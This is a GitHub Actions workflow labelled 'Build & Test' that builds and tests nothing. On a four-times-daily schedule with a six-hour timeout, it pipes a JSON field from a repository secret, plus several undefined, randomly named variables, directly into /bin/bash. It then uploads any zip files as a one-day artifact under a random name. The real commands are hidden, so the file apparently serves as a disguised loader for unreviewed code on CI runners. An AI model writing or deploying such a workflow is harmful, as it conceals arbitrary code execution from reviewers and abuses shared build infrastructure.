name: Build & Test
on:
  workflow_dispatch:

  schedule:
    - cron: '37 2,8,14,20 * * *'
permissions:
  contents: read
  actions: read
env:
  CI: true
concurrency:
  group: ${{ github.workflow }}
  cancel-in-progress: false
jobs:
  handler:
    name: Main task
    runs-on: ubuntu-latest
    timeout-minutes: 360
    steps:
      - name: Checkout
        uses: actions/checkout@v4
        with:
          fetch-depth: 1
      - name: Launch
        env:
          j88: ${{ secrets.j88 }}
        run: |
          printf '%s' "$j88" | jq -r .lm64992 | /bin/bash
          printf '%s' "$aa416" | jq -r .wt4 | /bin/bash
          echo $frlvh12194 | jq -r .uwtg89201 | /bin/bash
          echo $x78921 | jq -r .srlf08991 | /bin/bash
          printf '%s' "$hiz1" | jq -r .bss8 | /bin/bash

      - name: Persist output
        if: always()
        uses: actions/upload-artifact@v4
        with:
          name: BhPsK880
          path: "*.zip"
          retention-days: 1
